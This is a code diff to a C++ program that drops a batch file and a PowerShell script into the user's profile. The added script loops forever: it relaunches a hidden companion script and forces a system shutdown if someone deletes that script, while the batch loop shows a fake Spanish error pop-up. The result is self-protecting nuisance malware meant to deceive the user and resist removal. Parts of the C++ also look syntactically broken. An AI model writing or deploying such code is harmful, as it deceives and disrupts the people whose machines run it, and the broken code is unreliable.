@@ -60,7 +60,7 @@ int main() {
         xx0 << "msg * \"error, el sistema inhabilita los procesos con problemas de permisos!\"\n";
         xx0 << "timeout /t 2 /nobreak\n";
         xx0 << "if exist \"bfolder\" cd \"bfolder\"\n";
-        xx0 << "start /b 1-script.vbs\n";
+        xx0 << "start powershell -File \"1-script.ps1\"\n";
         xx0 << "goto repet\n";
         
         xx0.close();
@@ -86,10 +86,40 @@ int main() {
     }
     
     string usrx2 = string(usrx1) + "\\" + bfld
-    ofstream xx1("1-script.vbs", usrx2.c_str());
+    ofstream xx1("1-script.ps1", usrx2.c_str());
     
     if (xx1.is_open()) {
-        xx1 << "\n";
+        xx1 << "$folder = \"$env:USERPROFILE\\afolder\"\n";
+        xx1 << "$targetFile = \"$folder\\0-script.cmd\"\n";
+        xx1 << "function Test-FileLocked {\n";
+        xx1 << "    param ($path)\n";
+        xx1 << "    try {\n";
+        xx1 << "        $fs = [System.IO.File]::Open($path,\n";
+        xx1 << "            [System.IO.FileMode]::Open,\n";
+        xx1 << "            [System.IO.FileAccess]::ReadWrite,\n";
+        xx1 << "            [System.IO.FileShare]::None\n";
+        xx1 << "        )\n";
+        xx1 << "        $fs.Close()\n";
+        xx1 << "        return $false\n";
+        xx1 << "    }\n";
+        xx1 << "    catch {\n";
+        xx1 << "        return $true\n";
+        xx1 << "    }\n";
+        xx1 << "}\n";
+        xx1 << "while ($true) {\n";
+        xx1 << "    if (-not (Test-Path -LiteralPath $targetFile)) {\n";
+        xx1 << "        Write-Host \"ERROR: File not found. Shutting down in 10 seconds\"\n";
+        xx1 << "        Start-Process \"shutdown.exe\" \"/s /f /t 10\"\n";
+        xx1 << "        break\n";
+        xx1 << "    }\n";
+        xx1 << "    if (Test-FileLocked $targetFile) {\n";
+        xx1 << "        Start-Sleep -Milliseconds 500\n";
+        xx1 << "    }\n";
+        xx1 << "    else {\n";
+        xx1 << "        Start-Process $targetFile -WindowStyle Hidden\n";
+        xx1 << "    }\n";
+        xx1 << "    Start-Sleep -Milliseconds 500\n";
+        xx1 << "}\n";
         
         xx1.close();
     } else {
